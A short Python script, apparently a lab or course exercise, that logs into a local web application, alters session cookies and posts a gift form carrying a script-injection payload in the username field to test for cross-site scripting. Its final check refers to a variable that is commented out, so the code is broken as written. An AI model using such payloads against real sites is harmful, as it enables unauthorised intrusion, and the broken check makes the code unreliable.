import requests
import time
with requests.Session() as s:
    url = "http://127.0.0.1/login.html"
    values = {
        "uname" : "LEGITLOGIN",
        "pword" : "PASSWORD"
    }
    req = s.post(url,data=values, allow_redirects = False)
    #print (req.text)
    #print (s.cookies.values())
    for cookie in s.cookies:
        cookie.secure = False
        print('sessionid' + str(cookie.secure))
    #sessionid = s.cookies.values()[0]
    #s.cookies['sessionid'] = 'hello'
    #s.cookies.set('sessionid',sessionid, secure = 'False')
    #sessionid.set(
    #print(sessionid)
    # time.sleep(3)
    req = s.get('http://127.0.0.1/gift.html')
    # req.cookies = s.cookies
    print (req.text)
    print (s.cookies)
    # #time.sleep(1)
    url = "http://127.0.0.1/gift.html"
    values = {
      "amount" : 95,
      "username" : "this acc <script> alert(VULNERABLE)</script>"
    }
    req = s.post(url,data=values)
    #result = req.text
    word = "<script>"
    print (req.text)
    if word in result:
        print('VULNERABLE')


    # print (req.headers)
    # print (req.cookies)
    #print (req.text)
    #req = s.get('http://127.0.0.1/gift/0')
    #print
